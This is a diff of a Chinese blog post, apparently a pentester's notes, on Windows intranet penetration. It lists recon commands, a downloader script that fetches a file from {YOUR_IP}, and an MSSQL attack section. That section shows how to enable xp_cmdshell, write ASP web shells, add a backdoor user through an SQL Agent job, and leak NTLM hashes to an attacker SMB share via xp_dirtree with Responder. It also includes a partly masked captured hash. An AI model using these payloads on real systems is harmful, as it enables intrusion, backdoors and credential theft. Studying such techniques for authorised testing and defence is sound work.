@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>windows内网渗透思路 | owefsad&#39;s blog</title>
+  <title>Pentesting test in windows | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
-<meta name="keywords" content="信息收集">
+<meta name="keywords" content="信息收集,pass the hash,mssql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows内网渗透思路">
+<meta property="og:title" content="Pentesting test in windows">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/windows内网渗透思路/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
 <meta property="og:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-22T23:28:26.505Z">
+<meta property="og:updated_time" content="2019-05-12T00:45:53.006Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows内网渗透思路">
+<meta name="twitter:title" content="Pentesting test in windows">
 <meta name="twitter:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
@@ -190,7 +190,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      windows内网渗透思路
+      Pentesting test in windows
     </h1>
   
 
@@ -207,16 +207,41 @@
 <p>本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.</p>
 <a id="more"></a>
 <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
-<li>系统信息</li>
-<li>网络信息</li>
-<li>应用程序及服务</li>
-<li>敏感数据与目录</li>
-<li>文件系统</li>
+<li>信息收集</li>
+<li>服务利用</li>
 </ul>
-<p><strong>系统信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">$ systeminfo|findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br><span class="line">$ systeminfo|findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">"OS Version"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cpu_type</span></span><br><span class="line">$ <span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></p>
-<p><strong>网络信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查路由表</span></span><br><span class="line">$ route <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查arp缓存</span></span><br><span class="line">$ arp -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查防火墙规则</span></span><br><span class="line">$ netstat -ano</span><br><span class="line">$ netsh firewall show config</span><br><span class="line">$ netsh firewall show state</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">**应用程序及服务**</span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># 查计划任务</span></span><br><span class="line">$ schtasks /QUERY /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查服务进程ID</span></span><br><span class="line">$ tasklist /svc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查安装的驱动</span></span><br><span class="line">$ driverquery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的程序和版本信息</span></span><br><span class="line">$ wmic product list brief</span><br><span class="line">$ wmic process list brief</span><br><span class="line">$ wmic startup list brief</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看.msi程序的执行权限</span></span><br><span class="line">$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否有setuid和setgid</span></span><br><span class="line">$ reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装丙丁和时间信息</span></span><br><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KBxxxxxxx"</span></span><br></pre></td></tr></table></figure></p>
-<p><strong>敏感数据和目录</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找硬编码文件</span></span><br><span class="line">$ <span class="built_in">cd</span> /</span><br><span class="line">$ dir /b/s password.txt</span><br><span class="line">$ dir /b/s config.*</span><br><span class="line">$ findstr /si password *.xml *.ini *.txt</span><br><span class="line">$ find /si login *.xml *.ini *.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找无人值守安装文件</span></span><br><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure></p>
-<p><strong>文件系统</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python执行os命令</span></span><br><span class="line">$ import os; os.system(<span class="string">"cmd /c &#123;command here&#125;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件是否可写</span></span><br><span class="line">$ dir /a-r<span class="_">-d</span> /s /b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用copy con命令创建ftp会话</span></span><br><span class="line">$ copy con ftp.bat</span><br><span class="line">ftp <span class="comment"># 输入执行会话名称，按回车到下一行，之后按CTRL+Z结束编辑，再按回车退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传脚本</span></span><br><span class="line">downloadfile.vbs </span><br><span class="line"></span><br><span class="line"><span class="comment">#Set your settings</span></span><br><span class="line">strFileURL = <span class="string">"http://&#123;YOUR_IP&#125;/&#123;FILE_NAME.EXT&#125;"</span></span><br><span class="line">strHDLocation = <span class="string">"c:\\&#123;FILE_NAME.EXT&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Fetch the file</span></span><br><span class="line">Set objXMLHTTP = CreateObject(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line">objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line">Set objADOStream = CreateObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = 1 <span class="string">'adTypeBinary</span></span><br><span class="line"><span class="string">objADOStream.Write objXMLHTTP.ResponseBody</span></span><br><span class="line"><span class="string">objADOStream.Position = 0 '</span>Set the stream position to the start</span><br><span class="line">Set objFSO = Createobject(<span class="string">"Scriptin</span></span><br><span class="line"><span class="string"># 未完..</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><p><strong>1.系统信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">$ systeminfo|findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br><span class="line">$ systeminfo|findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">"OS Version"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cpu_type</span></span><br><span class="line">$ <span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></p>
+<p><strong>2.网络信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查路由表</span></span><br><span class="line">$ route <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查arp缓存</span></span><br><span class="line">$ arp -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查防火墙规则</span></span><br><span class="line">$ netstat -ano</span><br><span class="line">$ netsh firewall show config</span><br><span class="line">$ netsh firewall show state</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">**3.应用程序及服务**</span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># 查计划任务</span></span><br><span class="line">$ schtasks /QUERY /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查服务进程ID</span></span><br><span class="line">$ tasklist /svc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查安装的驱动</span></span><br><span class="line">$ driverquery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的程序和版本信息</span></span><br><span class="line">$ wmic product list brief</span><br><span class="line">$ wmic process list brief</span><br><span class="line">$ wmic startup list brief</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看.msi程序的执行权限</span></span><br><span class="line">$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否有setuid和setgid</span></span><br><span class="line">$ reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装丙丁和时间信息</span></span><br><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KBxxxxxxx"</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>4.敏感数据和目录</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找硬编码文件</span></span><br><span class="line">$ <span class="built_in">cd</span> /</span><br><span class="line">$ dir /b/s password.txt</span><br><span class="line">$ dir /b/s config.*</span><br><span class="line">$ findstr /si password *.xml *.ini *.txt</span><br><span class="line">$ find /si login *.xml *.ini *.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找无人值守安装文件</span></span><br><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure></p>
+<p><strong>5.文件系统</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python执行os命令</span></span><br><span class="line">$ import os; os.system(<span class="string">"cmd /c &#123;command here&#125;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件是否可写</span></span><br><span class="line">$ dir /a-r<span class="_">-d</span> /s /b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用copy con命令创建ftp会话</span></span><br><span class="line">$ copy con ftp.bat</span><br><span class="line">ftp <span class="comment"># 输入执行会话名称，按回车到下一行，之后按CTRL+Z结束编辑，再按回车退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传脚本</span></span><br><span class="line">downloadfile.vbs </span><br><span class="line"></span><br><span class="line"><span class="comment">#Set your settings</span></span><br><span class="line">strFileURL = <span class="string">"http://&#123;YOUR_IP&#125;/&#123;FILE_NAME.EXT&#125;"</span></span><br><span class="line">strHDLocation = <span class="string">"c:\\&#123;FILE_NAME.EXT&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Fetch the file</span></span><br><span class="line">Set objXMLHTTP = CreateObject(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line">objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line">Set objADOStream = CreateObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = 1 <span class="string">'adTypeBinary</span></span><br><span class="line"><span class="string">objADOStream.Write objXMLHTTP.ResponseBody</span></span><br><span class="line"><span class="string">objADOStream.Position = 0 '</span>Set the stream position to the start</span><br><span class="line">Set objFSO = Createobject(<span class="string">"Scriptin</span></span><br><span class="line"><span class="string"># 未完..</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="二、服务利用"><a href="#二、服务利用" class="headerlink" title="二、服务利用"></a>二、服务利用</h2><ul>
+<li>0x00 MsSql</li>
+</ul>
+<p>本小节将持续更新…</p>
+<h3 id="0x00-MsSql-Escalate-Privilege"><a href="#0x00-MsSql-Escalate-Privilege" class="headerlink" title="0x00 MsSql Escalate Privilege"></a>0x00 MsSql Escalate Privilege</h3><p>进入数据库后, 考虑从数据库中搜集信息、读数据库服务器上的操作系统文件进行信息收集、写文件插入WEB木马或覆盖计划任务、执行操作系统命令收集信息、利用存储过程与UNC获取NTLM Hash进行横向渗透等。<br>MsSql目前为止最新版本为2017。</p>
+<blockquote>
+<p>预备知识</p>
+<ol>
+<li>SqlServer自带默认数据库：master、tempdb、model、msdb，还有两个实例数据库：Northwind、pubs</li>
+<li>数据库登陆方式分为windows用户认证和数据库用户认证</li>
+<li>数据库文件后缀为mdf, 如：msdb.mdf; 日志文件后缀为ldf, 如：msdb.ldf</li>
+<li>只有在sysadmin权限下才可以使用存储过程xp_cmdshell; mssql 2000中, xp_cmdshell默认开启; mssql 2005及以上, 存储过程xp_cmdshell默认禁用; </li>
+</ol>
+</blockquote>
+<h4 id="MsSql基本操作"><a href="#MsSql基本操作" class="headerlink" title="MsSql基本操作"></a>MsSql基本操作</h4><p><strong>1.xp_cmdshell开启与关闭</strong><br>MsSql执行操作系统命令主要依赖于xp_cmdshell存储过程, 在MsSql 2005及以上的数据库中xp_cmdshell默认被禁用, 所以需要掌握开启xp_cmdshell的语法;<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--开启xp_cmdshell</span></span><br><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXEC sp_configure '</span>xp_cmdshell<span class="string">',1</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--关闭xp_cmdshell</span></span><br><span class="line"><span class="string">EXEC sp_configure '</span><span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXEC sp_configure '</span>xp_cmdshell<span class="string">',0</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>2. 数据搜索</strong><br>mssql数据搜索的内容互联网上已经有一份完整的cheat-sheet, 参考cheatsheet: <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank" rel="noopener">mssql-sql-injection-cheat-sheet</a>即可完成这些工作.</p>
+<p><strong>3. 操作文件系统</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--读文件到数据表然后查看</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mydata (line <span class="built_in">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">BULK <span class="keyword">INSERT</span> mydata <span class="keyword">FROM</span> ‘c:boot.ini’;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> mydata;</span><br><span class="line"></span><br><span class="line"><span class="comment">--sp_makewebtask写文件到服务器</span></span><br><span class="line">exec sp_makewebtask 'c:\www\testwr.asp','<span class="keyword">select</span><span class="string">''</span>&lt;%<span class="keyword">execute</span>(request(<span class="string">"SB"</span>))%&gt;<span class="string">''</span> <span class="string">'</span></span><br><span class="line"><span class="string">exec sp_makewebtask '</span>c:\www\testwri.asp<span class="string">','</span><span class="keyword">select</span><span class="string">''</span>&lt;%<span class="keyword">execute</span>(request(<span class="string">"SB"</span>))%&gt;<span class="string">''</span> <span class="string">'</span></span><br><span class="line"><span class="string">--xp_cmdshell写文件</span></span><br><span class="line"><span class="string">exec master..xp_cmdshell '</span>echo ^&lt;%eval request(<span class="string">"pass"</span>)%^&gt; &gt;c:\www\update.asp<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--xp_subdirs查看目录(只有目录没有文件)</span></span><br><span class="line"><span class="string">exec master.dbo.xp_subdirs '</span>c:\www\<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--xp_dirtree查看目录和文件</span></span><br><span class="line"><span class="string">EXEC master.sys.xp_dirtree ‘\\10.10.10.154\myshare’</span></span><br></pre></td></tr></table></figure>
+<p><strong>4. 执行操作系统命令</strong><br>xp_cmdshell存储过程是执行操作系统命令的首选, 它依赖于xplog70.dll, 如果xp_cmdshell被禁用且xplog70.dll文件被删除, 则考虑利用其它方式执行操作系统命令, 如job。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell ‘net user’;</span><br></pre></td></tr></table></figure></p>
+<p><strong>5. 限制条件下的渗透测试</strong></p>
+<p><strong>当删除xp_cmdshell并删除必要的DLL时，如何执行OS命令</strong><br>1.xplog70.dll文件存在<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方式一</span></span><br><span class="line">EXEC sp_addextendedproc 'xp_cmdshell','xplog70.dll'</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方式二</span></span><br><span class="line">EXEC sp_addextendedproc xp_cmdshell,'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'</span><br></pre></td></tr></table></figure></p>
+<p>2.xplog70.dll文件不存在<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--通过操作系统的job执行操作系统的命令</span></span><br><span class="line"><span class="keyword">DECLARE</span> @jobID uniqueidentifier, @cmdvarchar(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">--定义要执行的操作系统命令</span></span><br><span class="line"><span class="keyword">SET</span> @cmd = <span class="string">'net user SpiderLabs TW-SPL5562/ADD'</span></span><br><span class="line"></span><br><span class="line">EXEC msdb.dbo.sp_add_job @job_name =<span class="string">'_tmp_MakeDirectory'</span>, @enabled = <span class="number">1</span>,@start_step_id = <span class="number">1</span>, @owner_login_name=<span class="string">'sa'</span>, @job_id = @jobID <span class="keyword">OUTPUT</span></span><br><span class="line">EXEC msdb.dbo.sp_add_jobstep @job_id = @jobID,@step_name = <span class="string">'Create Backup Folder'</span>, @step_id = <span class="number">1</span>, @subsystem = <span class="string">'CMDEXEC'</span>,@command = @cmd</span><br><span class="line">EXEC msdb.dbo.sp_add_jobserver @job_id = @jobID</span><br><span class="line">EXEC msdb.dbo.sp_start_job @job_id = @jobID,@output_flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">WAITFOR DELAY <span class="string">'000:00:05'</span> </span><br><span class="line"><span class="keyword">IF</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> msdb.dbo.sysjobsWHERE <span class="keyword">name</span> = <span class="string">'_tmp_MakeDirectory'</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">EXECmsdb.dbo.sp_delete_job @job_name = <span class="string">'_tmp_MakeDirectory'</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">go</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>xp_makewebtask存储过程开启</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure 'Web Assistant Procedures', 1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure></p>
+<p><strong>6. xp_dirtree、xp_fileexit提权</strong><br>进入数据库后, 在服务器上打开远程文件将运行MsSql服务账号的NTLM哈希值发送到远程主机, 这是因为windows机器在打开UNC文件时会直接发送NTLM哈希值进行认证, 所以打开UNC时NTLM哈希会直接发送到远程主机445端口上, 在445端口监听并接收即可。<br>MsSql中可以通过<code>xp_DirTree</code>、<code>xp_fileexit</code>、<code>xp_cmdshell</code>等方式打开远程共享文件使服务器发送NTLM哈希值, 通过impacket的mssqlserver或Responder或自定义的SMB服务器等在攻击机器上开启SMB Server接收NTLM哈希值。拿到windows账号后, 开始进行提权windows提权。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送NTLM Hash</span></span><br><span class="line">EXEC Master.dbo.xp_DirTree <span class="string">"\\&lt;ip&gt;\&lt;share&gt;"</span>;</span><br><span class="line"></span><br><span class="line">EXEC Master.dbo.xp_fileexit <span class="string">"\\&lt;ip&gt;\&lt;share&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收NTLM Hash</span></span><br><span class="line">$ smbserver.py -smb2support myshare /tmp</span><br><span class="line"></span><br><span class="line">$ responder -I eth0</span><br></pre></td></tr></table></figure></p>
+<p>攻击者接收到的NTLM Hash打印在shell的输出中, 格式为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssql-svc::QUERIER:41414********141:32c3771953aadd26********d4bd9ab6:0101000000000000002b51864207********19aa772e88b200000000010010005a0054006d0076007a0053004a006e00030010005a0054006d0076007a0053004a006e000200100047006d00570059004300780071007a000400100047006d00570059004300780071007a0007000800002b51864207d501060004000200000008003000300000000000000000000000003000009d0b4c505ba7e636ef96e2fd65ccaa49b274f02c869919f6be981402eeb5b4900a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310031003100000000000000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>其中, mssql-svc为用户名, QUERIER为MsSql所在机器的主机名, 后面的三段为NTLM Hash.</p>
+<p>拿到NTLM Hash后, 开始进行一些列的横向渗透, 考虑爆破NTLM Hash值、用NTLM Hash登陆MsSql、SMB等.<br>关于如何利用NTLM Hash进行横向渗透的内容, 请参考<a href="https://www.hacklikeapornstar.com/all-pth-techniques/" target="_blank" rel="noopener">path-to-hash</a>及其他互联网内容.</p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" target="_blank" rel="noopener">how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478</a><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/" target="_blank" rel="noopener">wendels-small-hacking-tricks-microsoft-sql-server-edition</a><br><a href="https://www.cnblogs.com/ichunqiu/p/7249516.html" target="_blank" rel="noopener">详述MSSQL服务在渗透测试中的利用</a><br><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a><br><a href="https://medium.com/ethical-hacking-blog/mssql-connectivity-with-sqsh-debec7188104" target="_blank" rel="noopener">mssql-client: sqsh</a><br><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">攻击mssql的存储过程</a><br><a href="https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/" target="_blank" rel="noopener">llmnr-nbtns-poisoning-using-responder</a></p>
 
       
 
@@ -231,6 +256,14 @@
 			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">信息收集</a>
+        		</li>
+      		 
